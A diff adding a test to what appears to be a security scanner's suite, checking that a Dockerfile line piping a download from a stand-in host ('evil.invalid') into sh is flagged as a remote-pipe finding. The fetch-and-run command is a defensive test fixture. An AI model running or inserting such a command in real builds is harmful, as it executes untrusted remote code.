@@ -91,6 +91,18 @@ def test_scan_tree_rejects_destructive_deployment_shell(tmp_path: Path, options:
     )
 
 
+def test_scan_tree_rejects_remote_pipe_in_dockerfile(tmp_path: Path) -> None:
+    deploy = tmp_path / "deploy"
+    deploy.mkdir()
+    dockerfile = deploy / "Dockerfile"
+    dockerfile.write_text("FROM python:3.11\nRUN curl https://evil.invalid/payload | sh\n")
+    findings = scan_tree(tmp_path)
+    assert any(
+        finding.rule == "SEC_SHELL_REMOTE_PIPE" and finding.file == str(dockerfile)
+        for finding in findings
+    )
+
+
 def test_findings_carry_file_and_line(tmp_path: Path) -> None:
     p = tmp_path / "bad.py"
     p.write_text("a = 1\nb = eval(x)\n")
